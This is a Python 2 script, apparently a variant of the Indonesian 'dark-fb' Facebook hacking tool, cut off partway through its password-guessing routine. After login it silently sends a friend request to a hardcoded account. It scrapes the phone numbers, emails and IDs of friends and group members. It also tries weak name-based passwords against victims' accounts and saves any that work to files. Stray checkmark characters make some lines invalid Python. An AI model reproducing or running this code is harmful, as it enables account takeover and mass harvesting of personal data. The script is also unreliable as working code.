# -*- coding: utf-8 -*-
import sys
sys.path.insert (0, "..")
from warna import *

import random, cookielib


br = Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [("User-Agent", "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]

	
#-Warna-#
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def logo():
	print ""
	system ("clear")
	print n + tebal +"█████████"
	print n + tebal +"█▄█████▄█     "+ b +"●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬●"
	print n + tebal +"█"+ m +"▼▼▼▼▼ "+ n + tebal +"-_- _-_-"+ h +" ╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗"
	print n + tebal +"█ --_ -_ -_- _-"+ h +"  ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗"
	print n + tebal +"█"+ m +"▲▲▲▲▲ "+ n + tebal +"--- -- -"+ h +" ═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝"
	print n + tebal +"█████████     "+ b +"«----------✧✧----------»"
	print n + tebal +" ██ ██ "+ c + miring +"       Achmad Khoirul Marzuqin"
	print n + u + 53 * "═"+ n +"\n"


back = 0 ✔
threads = [] ✔
berhasil = [] ✔
cekpoint = [] ✔
oks = [] ✔
gagal = [] ✔
idteman = [] ✔
idfromteman = [] ✔
idmem = [] ✔
emmem = [] ✔
nomem = [] ✔
id = [] ✔
em = [] ✔
emfromteman = [] ✔
hp = [] ✔
hpfromteman = [] ✔
reaksi = [] ✔
reaksigrup = [] ✔
komen = [] ✔
komengrup = [] ✔
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


def masuk():
	try:
		open ("Token.txt", "r")
		menu()
	except IOError:
		logo()
		print u +"╔══╗"
		print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
		print u +"║  ║"
		print u +"║"+ h +"01"+ u +"║"+ h +" Masuk Dengan Akun Facebook"
		print u +"║"+ k +"02"+ u +"║"+ k +" Masuk Dengan Token Facebook"
		print u +"╚══╝\n"
		msuk = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
		if msuk == "01" or msuk == "1":
			login()
		elif msuk == "02" or msuk == "2":
			tokenz()
		else:
			salah()
			masuk()


def login():
	try:
		br.open ("https://m.facebook.com")
		logo()
		print b +"• Masuk Dengan Akun Facebook"
		id = raw_input (u +"›"+ h +" Nomor / Email / Id "+ n +": ")
		pwd = getpass.getpass (u +"›"+ k +" Kata Sandi         "+ n +": ")
		print ""
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form["email"] = id
		br.form["pass"] = pwd
		br.submit()
		url = br.geturl()
		if "save-device" in url:
			try:
				sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail="+ id +"format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword="+ pwd +"return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32"
				data = {"api_key": "882a8490361da98702bf97a021ddc14d", "credentials_type": "password", "email": id, "format": "JSON", "generate_machine_id": "1", "generate_session_cookies": "1", "locale": "en_US", "method": "auth.login", "password": pwd, "return_ssl_resources": "0", "v": "1.0"}
				x = hashlib.new("md5")
				x.update(sig)
				a = x.hexdigest()
				data.update({"sig":a})
				url = "https://api.facebook.com/restserver.php"
				r = get(url,params=data)
				z = json.loads(r.text)
				zedd = open ("Token.txt", "w")
				zedd.write(z["access_token"])
				zedd.close()
				print h +"✔ Berhasil Masuk Akun Facebook"
				post ("https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token="+ z["access_token"])
				menu()
			except ConnectionError:
				koneksi()
				login()
		elif "checkpoint" in url:
			system ("rm -rf Token.txt")
			print tebal + m +"!!! Akun Facebook Terkena Checkpoint"+ n
			sleep (5)
			login()
		else:
			print m +"✘ Gagal Masuk Dengan Akun Facebook"
			sleep (5)
			masuk()
	except URLError:
		koneksi()
		login()


def tokenz():
	logo()
	newtoket = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Masukkan Token Facebook "+ n +": ")
	try:
		otw = get ("https://graph.facebook.com/me?access_token="+ newtoket)
		a = json.loads(otw.text)
		nama = a["name"]
		zedd = open ("Token.txt", "w")
		zedd.write(newtoket)
		zedd.close()
		menu()
	except ConnectionError:
		koneksi()
		tokenz()
	except KeyError:
		print m +"✘ Gagal Masuk Dengan Token Facebook"
		sleep (5)
		masuk()


def menu():
	logo()
	try:
		toket = open ("Token.txt", "r").read()
		otw = get ("https://graph.facebook.com/me?access_token="+ toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
		print u +"╔"+ 52 * "═"
		print u +"║"+ k +" Nama "+ n +": "+ h + nama
		print u +"║"+ h +" Id "+ n +": "+ k + id
		print u +"╚"+ 52 * "═"
		print u +"╔══╗"
		print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
		print u +"║  ║"
		print u +"║"+ n +"01"+ u +"║"+ n +" Informasi Pengguna"
		print u +"║"+ c +"02"+ u +"║"+ c +" Mengambil Nomor / Email / Id"
		print u +"║"+ m +"03"+ u +"║"+ m +" Hack Akun Facebook"
		print u +"║"+ h +"04"+ u +"║"+ h +" Bot Facebook"
		print u +"║"+ k +"05"+ u +"║"+ k +" Lain-Lain"
		print u +"║"+ p +"06"+ u +"║"+ p +" Lihat Token Facebook"
		print u +"║"+ b +"07"+ u +"║"+ b +" Hapus Cache"
		print u +"║"+ n +"08"+ u +"║"+ n +" Keluar Akun Facebook"
		print u +"║"+ c +"09"+ u +"║"+ c +" Kembali"
		print u +"╚══╝\n"
		zedd = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor "+ n +": ")
		if zedd == "01" or zedd == "1":
			informasi()
		elif zedd == "02" or zedd == "2":
			dump()
		elif zedd == "03" or zedd == "3":
			menu_hack()
		elif zedd == "04" or zedd == "4":
			menu_bot()
		elif zedd == "05" or zedd == "5":
			lain()
		elif zedd == "06" or zedd == "6":
			logo()
			print n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Token Facebook "+ n +": "+ toket
			enter()
			menu()
		elif zedd == "07" or zedd == "7":
			system ("rm -rf out")
		elif zedd == "08" or zedd == "8":
			system ("rm -f Token.txt")
			masuk()
		elif zedd == "09" or zedd == "9":
			system ("exit")
		else:
			salah()
			menu()
	except ConnectionError:
		koneksi()
		menu()
	except KeyError:
		print tebal + m +"!!! Akun Facebook Terkena Checkpoint"+ n
		system ("rm -rf Token.txt")
		sleep (5)
		masuk()


def informasi():
	logo()
	toket = open ("Token.txt", "r").read()
	aid = raw_input (u +"›"+ k +" Nama / Id "+ n +": ")
	print ""
	r = get ("https://graph.facebook.com/me/friends?access_token="+ toket)
	cok = json.loads(r.text)
	for i in cok["data"]:
		if aid in i["name"] or aid in i["id"]:
			x = get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket)
			z = json.loads(x.text)
			print u +"╔═╗"
			try:
				print u +"║"+ h +"•"+ u +"║"+ b +" Nama"+ n +" : "+ h + z["name"]
			except KeyError:
				print u +"║"+ m +"•"+ u +"║"+ b +" Nama"+ n +" : "+ m +"Data Tidak Ditemukan"
			try:
				print u +"║"+ h  +"•"+ u +"║"+ b +" Nomor"+ n +" : "+ h + z["mobile_phone"]
			except KeyError:
				print u +"║"+ m  +"•"+ u +"║"+ b +" Nomor"+ n +" : "+ m +"Data Tidak Ditemukan"
			try:
				print u +"║"+ h +"•"+ u +"║"+ b +" Email"+ n +" : "+ h + z["email"]
			except KeyError:
				print u +"║"+ m +"•"+ u +"║"+ b +" Email"+ n +" : "+ m +"Data Tidak Ditemukan"
			try:
				print u +"║"+ h +"•"+ u +"║"+ b +" Id"+ n +" : "+ h + z["id"]
			except KeyError:
				print u +"║"+ m +"•"+ u +"║"+ b +" Id"+ n +" : "+ m +"Data Tidak Ditemukan"
			try:
				print u +"║"+ h +"•"+ u +"║"+ b +" Tanggal Lahir"+ n +" : "+ h + z["birthday"]
			except KeyError:
				print u +"║"+ m +"•"+ u +"║"+ b +" Tanggal Lahir"+ n +" : "+ m +"Data Tidak Ditemukan"
			try:
				print u +"║"+ h +"•"+ u +"║"+ b +" Alamat"+ n +" : "+ h + z["location"]["name"]
			except KeyError:
				print u +"║"+ m +"•"+ u +"║"+ b +" Alamat"+ n +" : "+ m +"Data Tidak Ditemukan"
			try:
				for q in z["education"]:
					print u +"║"+ h +"•"+ u +"║"+ b +" Pendidikan"+ n +" : "+ h + q["school"]["name"]
			except KeyError:
				print u +"║"+ m +"•"+ u +"║"+ b +" Pendidikan"+ n +" : "+ m +"Data Tidak Ditemukan"
			print u +"╚═╝\n"
			enter()
			menu()
	else:
		print m +"✘ Akun Facebook Tidak Ditemukan"
		sleep (5)
		menu()


def dump():
	logo()
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ n +"01"+ u +"║"+ n +" Nomor Teman"
	print u +"║"+ c +"02"+ u +"║"+ c +" Email Teman"
	print u +"║"+ m +"03"+ u +"║"+ m +" Id Teman"
	print u +"║"+ h +"04"+ u +"║"+ h +" Nomor Temannya Dari Teman"
	print u +"║"+ k +"05"+ u +"║"+ k +" Email Temannya Dari Teman"
	print u +"║"+ p +"06"+ u +"║"+ p +" Id Temannya Dari Teman"
	print u +"║"+ b +"07"+ u +"║"+ b +" Nomor Anggota Grub"
	print u +"║"+ n +"08"+ u +"║"+ n +" Email Anggota Grub"
	print u +"║"+ c +"09"+ u +"║"+ c +" Id Anggota Grub"
	print u +"║"+ m +"10"+ u +"║"+ m +" Mencari Id"
	print u +"║"+ h +"99"+ u +"║"+ h +" Kembali"
	print u +"╚══╝\n"
	cuih = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor "+ n +": ")
	if cuih == "01" or cuih == "1":
		nomor_teman()
	elif cuih == "02" or cuih == "2":
		email_teman()
	elif cuih == "03" or cuih == "3":
		id_teman()
	elif cuih == "04" or cuih == "4":
		nomor_temannya_dari_teman()
	elif cuih == "05" or cuih == "5":
		email_temannya_dari_teman()
	elif cuih == "06" or cuih == "6":
		id_temannya_dari_teman()
	elif cuih == "07" or cuih == "7":
		nomor_anggota_grup()
	elif cuih == "08" or cuih == "8":
		email_anggota_grup()
	elif cuih == "09" or cuih == "9":
		id_anggota_grup()
	elif cuih == "10":
		print m +"\nSilahkan Hubungi Pembuat Script Ini"
		print h + tebal +"https://github.com/rezadkim/dark-fb"+ n
		sleep (5)
		dump()
	elif cuih == "99":
		menu()
	else:
		salah()
		dump()


nomorteman = []
def nomor_teman():
	logo()
	toket = open ("Token.txt", "r").read()
	r = get ("https://graph.facebook.com/me/friends?access_token="+ toket)
	j = json.loads(r.text)
	rj = open ("out/nomor_teman.txt", "w")
	for i in j["data"]:
		ri = get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket)
		ji = json.loads(ri.text)
		nomorteman.append(ji["mobile_phone"])
		rj.write(ji["mobile_phone"] + "\n")
		print h +"\r✔ "+ ji["mobile_phone"] + u +" => "+ n + ji["name"],
		sys.stdout.flush()
	rj.close()
	print u +"\r•"+ k +" Jumlah Nomor "+ n +": "+ h + str(len(nomorteman))
	done = raw_input (u +"›"+ k +" Simpan "+ h +"Nomor Teman"+ k +" Dengan Nama "+ n +": ")
	move ("out/nomor_teman.txt", "out/"+ done)
	print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
	enter()
	dump()


emailteman = []
def email_teman():
	logo()
	toket = open ("Token.txt", "r").read()
	r = get ("https://graph.facebook.com/me/friends?access_token="+ toket)
	j = json.loads(r.text)
	rj = open ("out/email_teman.txt", "w")
	for i in j["data"]:
		ri = get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket)
		ji = json.loads(ri.text)
		emailteman.append(ji["email"])
		rj.write(ji["email"] + "\n")
		print h +"\r✔ "+ ji["email"] + u +" => "+ n + ji["name"],
		sys.stdout.flush()
	rj.close()
	print u +"\r•"+ k +" Jumlah Email "+ n +": "+ h + str(len(emailteman))
	done = raw_input (u +"›"+ k +" Simpan "+ h +"Email Teman"+ k +" Dengan Nama "+ n +": ")
	move ("out/email_teman.txt", "out/"+ done)
	print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
	enter()
	dump()


idteman = []
def id_teman():
	logo()
	toket = open ("Token.txt", "r").read()
	r = get ("https://graph.facebook.com/me/friends?access_token="+ toket)
	j = json.loads(r.text)
	rj = open ("out/id_teman.txt", "w")
	for i in j["data"]:
		idteman.append(i["id"])
		rj.write(i["id"] + "\n")
		print h +"\r✔ "+ i["id"] + u +" => "+ n + i["name"],
		sys.stdout.flush()
	rj.close()
	print u +"\r•"+ k +" Jumlah Id "+ n +": "+ h + str(len(idteman))
	done = raw_input (u +"›"+ k +" Simpan "+ h +"Id Teman"+ k +" Dengan Nama "+ n +": ")
	move ("out/id_teman.txt", "out/"+ done)
	print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
	enter()
	dump()


nomortemannyadariteman = []
def nomor_temannya_dari_teman():
	logo()
	toket = open ("Token.txt", "r").read()
	id = raw_input (u +"›"+ k +" Id Profil  "+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Nomor Temannya Dari "+ jl["name"]
		r = get ("https://graph.facebook.com/"+ id +"/friends?access_token="+ toket)
		j = json.loads(r.text)
		rj = open ("out/nomor_temannya_dari_teman.txt", "w")
		for i in j["data"]:
			ri = get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket)
			ji = json.loads(ri.text)
			nomortemannyadariteman.append(ji["mobile_phone"])
			rj.write(ji["mobile_phone"] + "\n")
			print h +"\r✔ "+ ji["mobile_phone"] + u +" => "+ n + ji["name"],
			sys.stdout.flush()
		rj.close()
		print u +"\r•"+ k +" Jumlah Nomor "+ n +": "+ h + str(len(nomortemannyadariteman))
		done = raw_input (u +"›"+ k +" Simpan "+ h +"Nomor Temannya Dari "+ jl["name"] + k +" Dengan Nama "+ n +": ")
		move ("out/nomor_temannya_dari_teman.txt", "out/"+ done)
		print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
		enter()
		dump()
	except KeyError:
		print m +"✘ Id Profil Tidak Ditemukan"
		sleep (5)
		dump()


emailtemannyadariteman = []
def email_temannya_dari_teman():
	logo()
	toket = open ("Token.txt", "r").read()
	id = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Email Temannya Dari "+ jl["name"]
		r = get ("https://graph.facebook.com/"+ id +"/friends?access_token="+ toket)
		j = json.loads(r.text)
		rj = open ("out/email_temannya_dari_teman.txt", "w")
		for i in j["data"]:
			ri = get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket)
			ji = json.loads(ri.text)
			emailtemannyadariteman.append(ji["email"])
			rj.write(ji["email"] + "\n")
			print h +"\r✔ "+ ji["email"] + u +" => "+ n + ji["name"],
			sys.stdout.flush()
		rj.close()
		print u +"\r•"+ k +" Jumlah Email "+ n +": "+ h + str(len(emailtemannyadariteman))
		done = raw_input (u +"›"+ k +" Simpan "+ h +"Email Temannya Dari "+ jl["name"] + k +" Dengan Nama "+ n +": ")
		move ("out/nomor_temannya_dari_teman.txt", "out/"+ done)
		print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
		enter()
		dump()
	except KeyError:
		print m +"✘ Id Profil Tidak Ditemukan"
		sleep (5)
		dump()


idtemannyadariteman = []
def id_temannya_dari_teman():
	logo()
	toket = open ("Token.txt", "r").read()
	id = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/"+ id +"?access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Id Temannya Dari "+ jl["name"]
		r = get ("https://graph.facebook.com/"+ id +"?fields=friends.limit(5000)&access_token="+ toket)
		j = json.loads(r.text)
		rj = open ("out/id_temannya_dari_teman.txt", "w")
		for i in j["friends"]["data"]:
			idtemannyadariteman.append(i["id"])
			rj.write(i["id"] + "\n")
			print h +"\r✔ "+ i["id"] + u +" => "+ n + i["name"],
			sys.stdout.flush()
		rj.close()
		print u +"\r•"+ k +" Jumlah Id "+ n +": "+ h + str(len(idtemannyadariteman))
		done = raw_input (u +"›"+ k +" Simpan "+ h +"Id Temannya Dari "+ jl["name"] + k +" Dengan Nama "+ n +": ")
		move ("out/id_temannya_dari_teman.txt", "out/"+ done)
		print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
		enter()
		dump()
	except KeyError:
		print m +"✘ Id Profil Tidak Ditemukan"
		sleep (5)
		dump()


nomoranggotagrup = []
def nomor_anggota_grup():
	logo()
	toket = open ("Token.txt", "r").read()
	id = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/group/?id="+ id +"&access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Nomor Anggota Grup "+ jl["name"]
		r = get ("https://graph.facebook.com/"+ id +"/members?fields=name,id&limit=999999999&access_token="+ toket)
		j = json.loads(r.text)
		rj = open ("out/nomor_anggota_grup.txt", "w")
		for i in j["data"]:
			ri = get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket)
			ji = json.loads(ri.text)
			nomoranggotagrup.append(ji["mobile_phone"])
			rj.write(ji["mobile_phone"] + "\n")
			print h +"\r✔ "+ ji["mobile_phone"] + u +" => "+ n + ji["name"],
			sys.stdout.flush()
		rj.close()
		print u +"\r•"+ k +" Jumlah Nomor "+ n +": "+ h + str(len(nomoranggotagrup))
		done = raw_input (u +"›"+ k +" Simpan "+ h +"Nomor Anggota Grup "+ jl["name"] + k +" Dengan Nama "+ n +": ")
		move ("out/nomor_anggota_grub.txt", "out/"+ done)
		print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
		enter()
		dump()
	except KeyError:
		print m +"✘ Id Grub Tidak Ditemukan"
		sleep (5)
		dump()


emailanggotagrup = []
def email_anggota_grup():
	logo()
	toket = open ("Token.txt", "r").read()
	id = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/group/?id="+ id +"&access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Email Anggota Grup "+ jl["name"]
		r = get ("https://graph.facebook.com/"+ id +"/members?fields=name,id&limit=999999999&access_token="+ toket)
		j = json.loads(r.text)
		rj = open ("out/email_anggota_grup.txt", "w")
		for i in j["data"]:
			ri = get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket)
			ji = json.loads(ri.text)
			emailanggotagrup.append(ji["email"])
			rj.write(ji["email"] + "\n")
			print h +"\r✔ "+ ji["email"] + u +" => "+ n + ji["name"],
			sys.stdout.flush()
		rj.close()
		print u +"\r•"+ k +" Jumlah Email "+ n +": "+ h + str(len(emailanggotagrup))
		done = raw_input (u +"›"+ k +" Simpan "+ h +"Email Anggota Grup "+ jl["name"] + k +" Dengan Nama "+ n +": ")
		move ("out/email_anggota_grub.txt", "out/"+ done)
		print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
		enter()
		dump()
	except KeyError:
		print m +"✘ Id Grub Tidak Ditemukan"
		sleep (5)
		dump()


idanggotagrup = []
def id_anggota_grup():
	logo()
	toket = open ("Token.txt", "r").read()
	id = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
	print ""
	try:
		rg = get ("https://graph.facebook.com/group/?id="+ id +"&access_token="+ toket)
		jl = json.loads(rg.text)
		print h +"✔ Id Anggota Grup "+ jl["name"]
		r = get ("https://graph.facebook.com/"+ id +"/members?fields=name,id&limit=999999999&access_token="+ toket)
		j = json.loads(r.text)
		rj = open ("out/id_anggota_grup.txt", "w")
		for i in j["data"]:
			idanggotagrup.append(i["id"])
			rj.write(i["id"] + "\n")
			print h +"\r✔ "+ i["id"] + u +" => "+ n + i["name"],
			sys.stdout.flush()
		rj.close()
		print u +"\r•"+ k +" Jumlah Id "+ n +": "+ h + str(len(idanggotagrup))
		done = raw_input (u +"›"+ k +" Simpan "+ h +"Id Anggota Grup "+ jl["name"] + k +" Dengan Nama "+ n +": ")
		move ("out/id_anggota_grub.txt", "out/"+ done)
		print h +"✔ Berhasil Menyimpan Dengan Nama "+ n +": "+ b +"out/"+ done
		enter()
		dump()
	except KeyError:
		print m +"✘ Id Grub Tidak Ditemukan"
		sleep (5)
		dump()


def menu_hack():
	logo()
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" Acak (Kata Sandi Otomatis)"
	print u +"║"+ h +"02"+ u +"║"+ h +" Acak (Memerlukan File Daftar Id Profil)"
	print u +"║"+ k +"03"+ u +"║"+ k +" Target (Kata Sandi Otomatis)"
	print u +"║"+ k +"04"+ u +"║"+ k +" Target (Memerlukan File Daftar Kata Sandi)"
	print u +"║"+ m +"05"+ u +"║"+ m +" Mengambil Email Yahoo"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	hack = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor "+ n +": ")
	if hack == "01" or hack == "1":
		super()
	elif hack == "02" or hack == "2":
		crack()
	elif hack == "03" or hack == "3":
		mini()
	elif hack == "04" or hack == "4":
		brute()
	elif hack == "05" or hack == "5":
		menu_yahoo()
	elif hack == "09" or hack == "9":
		menu()
	else:
		salah()
		menu_hack()


oks = []
cekpoint = []
def super():
	logo()
	toket = open ("Token.txt", "r").read()
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" Hack Id Teman"
	print u +"║"+ k +"02"+ u +"║"+ k +" Hack Id Temannya Dari Teman"
	print u +"║"+ m +"03"+ u +"║"+ m +" Hack Id Anggota Grub"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	peak = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if peak == "01" or peak == "1":
		logo()
		r = get ("https://graph.facebook.com/me/friends?access_token="+ toket)
		z = json.loads(r.text)
		for ss in z["data"]:
			id.append(ss["id"])
	elif peak == "02" or peak == "2":
		logo()
		idt = raw_input (u +"›"+ k +" Id Profil "+ n +": ")
		print ""
		try:
			jok = get ("https://graph.facebook.com/"+ idt +"?access_token="+ toket)
			op = json.loads(jok.text)
			print h +"✔ Id Temannya Dari "+ op["name"]
		except KeyError:
			print m +"✘ Id Profil Tidak Ditemukan"
			sleep (5)
			super()
		r = get ("https://graph.facebook.com/"+ idt +"/friends?access_token="+ toket)
		z = json.loads(r.text)
		for ii in z["data"]:
			id.append(ii["id"])
	elif peak == "03" or peak == "3":
		logo()
		idg = raw_input (u +"›"+ k +" Id Grup "+ n +": ")
		print ""
		try:
			r = get ("https://graph.facebook.com/group/?id="+ idg +"&access_token="+ toket)
			asw = json.loads(r.text)
			print h +"✔ Id Anggota Grup "+ asw["name"]
		except KeyError:
			print m +"✘ Id Grub Tidak Ditemukan"
			sleep (5)
			super()
		re = get ("https://graph.facebook.com/"+ idg +"/members?fields=name,id&limit=999999999&access_token="+ toket)
		s = json.loads(re.text)
		for pp in s["data"]:
			id.append(pp["id"])
	elif peak == "09" or peak == "9":
		menu_hack()
	else:
		salah()
		super()
	
	
	print u +"\r•"+ k +" Jumlah Id "+ n +": "+ h + str(len(id))
	print u + 53 * "═"
	
	
	def main(arg):
		global oks, cekpoint
		toket = open ("Token.txt", "r").read()
		user = arg
		ai = get ("https://graph.facebook.com/"+ user +"/?access_token="+ toket)
		bi = json.loads(ai.text)
		
		
		pass1 = bi["first_name"] +"123"
		data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass1) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		q = json.load(data)
		if "access_token" in q:
			x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
			z = json.loads(x.text)
			print h +"✔ "+ user + u +" | "+ h + pass1 + u +" => "+ n + z["name"]
			kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
			kec.write(user +" | "+ pass1 +" => "+ z["name"] +"\n")
			kec.close()
			oks.append(user+pass1)
		elif "www.facebook.com" in q["error_msg"]:
			print m +"✘ "+ user + u +" | "+ m + pass1
			cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
			cek.write(user +" | "+ pass1 +"\n")
			cek.close()
			cekpoint.append(user+pass1)
		else:
			pass2 = bi["first_name"] +"12345"
			data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass2) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
				z = json.loads(x.text)
				print h +"✔ "+ user + u +" | "+ h + pass2 + u +" => "+ n + z["name"]
				kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
				kec.write(user +" | "+ pass2 +" => "+ z["name"] +"\n")
				kec.close()
				oks.append(user+pass2)
			elif "www.facebook.com" in q["error_msg"]:
				print m +"✘ "+ user + u +" | "+ m + pass2
				cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
				cek.write(user +" | "+ pass2 +"\n")
				cek.close()
				cekpoint.append(user+pass2)
			else:
				pass3 = bi["middle_name"] +"123"
				data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass3) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				q = json.load(data)
				if "access_token" in q:
					x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
					z = json.loads(x.text)
					print h +"✔ "+ user + u +" | "+ h + pass3 + u +" => "+ n + z["name"]
					kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
					kec.write(user +" | "+ pass3 +" => "+ z["name"] +"\n")
					kec.close()
					oks.append(user+pass3)
				elif "www.facebook.com" in q["error_msg"]:
					print m +"✘ "+ user + u +" | "+ m + pass3
					cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
					cek.write(user +" | "+ pass3 +"\n")
					cek.close()
					cekpoint.append(user+pass3)
				else:
					pass4 = bi["middle_name"] +"12345"
					data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass4) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
						z = json.loads(x.text)
						print h +"✔ "+ user + u +" | "+ h + pass4 + u +" => "+ n + z["name"]
						kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
						kec.write(user +" | "+ pass4 +" => "+ z["name"] +"\n")
						kec.close()
						oks.append(user+pass4)
					elif "www.facebook.com" in q["error_msg"]:
						print m +"✘ "+ user + u +" | "+ m + pass4
						cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
						cek.write(user +" | "+ pass4 +"\n")
						cek.close()
						cekpoint.append(user+pass4)
					else:
						pass5 = bi["last_name"] +"123"
						data = urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ (user) +"&locale=en_US&password="+ (pass5) +"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						q = json.load(data)
						if "access_token" in q:
							x = get ("https://graph.facebook.com/"+ user +"?access_token="+ q["access_token"])
							z = json.loads(x.text)
							print h +"✔ "+ user + u +" | "+ h + pass5 + u +" => "+ n + z["name"]
							kec = open ("/data/data/com.termux/files/home/storage/shared/Berhasil.txt", "a")
							kec.write(user +" | "+ pass5 +" => "+ z["name"] +"\n")
							kec.close()
							oks.append(user+pass5)
						elif "www.facebook.com" in q["error_msg"]:
							print m +"✘ "+ user + u +" | "+ m + pass5
							cek = open ("/data/data/com.termux/files/home/storage/shared/Checkpoint.txt", "a")
